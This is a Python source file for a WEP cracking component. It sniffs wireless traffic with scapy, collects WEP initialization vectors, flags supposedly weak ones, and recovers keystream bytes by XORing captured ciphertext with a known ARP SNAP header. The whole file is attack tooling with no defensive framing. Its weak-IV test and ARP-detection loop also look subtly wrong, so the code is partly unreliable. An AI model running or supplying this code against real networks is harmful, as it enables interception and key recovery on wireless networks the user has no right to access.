import threading
import time
from scapy.all import sniff, Dot11, LLC, SNAP, ARP
from collections import defaultdict


class WEPCapture:
    def __init__(self):
        self.ivs = []
        self.weak_ivs = []
        self.is_capturing = False
        self.capture_thread = None
        self.iv_count = 0
        self.weak_iv_count = 0
        self.on_iv_captured = None
        self.lock = threading.Lock()

    def is_weak_iv(self, iv):
        iv1, iv2, iv3 = iv
        return iv3 == 255 and iv2 >= 3 and (iv1 & 0x1F) == iv2 - 3

    def extract_wep_iv(self, packet):
        if Dot11 in packet and packet[Dot11].type == 2:
            try:
                wep_data = packet.load
                if len(wep_data) >= 4:
                    iv = (wep_data[0], wep_data[1], wep_data[2])
                    keyid = wep_data[3]
                    return iv, keyid, list(wep_data[4:])
            except:
                pass
        return None, None, None

    def is_arp_packet(self, packet):
        try:
            if Dot11 in packet:
                payload = packet.payload
                while hasattr(payload, 'payload'):
                    payload = payload.payload
                    if ARP in payload:
                        return True
            return False
        except:
            return False

    def packet_handler(self, packet):
        if not self.is_capturing:
            return

        iv, keyid, encrypted = self.extract_wep_iv(packet)
        if iv is not None:
            is_weak = self.is_weak_iv(iv)
            with self.lock:
                self.iv_count += 1
                self.ivs.append({
                    'iv': iv,
                    'keyid': keyid,
                    'encrypted': encrypted or [],
                    'is_weak': is_weak,
                    'timestamp': time.time()
                })

                if is_weak:
                    self.weak_iv_count += 1
                    self.weak_ivs.append({
                        'iv': iv,
                        'keyid': keyid,
                        'encrypted': encrypted or [],
                        'is_weak': True,
                        'timestamp': time.time()
                    })

                    if self.on_iv_captured:
                        self.on_iv_captured(self.iv_count, self.weak_iv_count)

    def start_capture(self, interface, bssid=None):
        if self.is_capturing:
            return

        self.is_capturing = True
        self.ivs = []
        self.weak_ivs = []
        self.iv_count = 0
        self.weak_iv_count = 0

        def capture_thread():
            sniff(
                iface=interface,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda p: not self.is_capturing
            )

        self.capture_thread = threading.Thread(target=capture_thread)
        self.capture_thread.daemon = True
        self.capture_thread.start()

    def stop_capture(self):
        self.is_capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)

    def get_stats(self):
        with self.lock:
            return {
                'total_ivs': self.iv_count,
                'weak_ivs': self.weak_iv_count
            }

    def get_weak_ivs_list(self):
        with self.lock:
            return [iv_data.copy() for iv_data in self.weak_ivs]

    def get_ivs_page(self, page=1, per_page=20, filter_type='all'):
        with self.lock:
            if filter_type == 'weak':
                source = self.weak_ivs
            else:
                source = self.ivs

            total = len(source)
            start = (page - 1) * per_page
            end = start + per_page
            items = source[start:end]

            return {
                'items': items,
                'total': total,
                'page': page,
                'per_page': per_page,
                'total_pages': max(1, (total + per_page - 1) // per_page)
            }

    def get_iv_keystream_pairs(self):
        with self.lock:
            pairs = []
            for iv_data in self.weak_ivs:
                iv = iv_data['iv']
                encrypted = iv_data['encrypted']
                if encrypted:
                    keystream = self._recover_keystream(iv, encrypted)
                    if keystream:
                        pairs.append((iv, keystream))
            return pairs

    def _recover_keystream(self, iv, encrypted):
        arp_snap = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06]
        min_len = min(len(encrypted), len(arp_snap))
        return [e ^ p for e, p in zip(encrypted[:min_len], arp_snap[:min_len])]
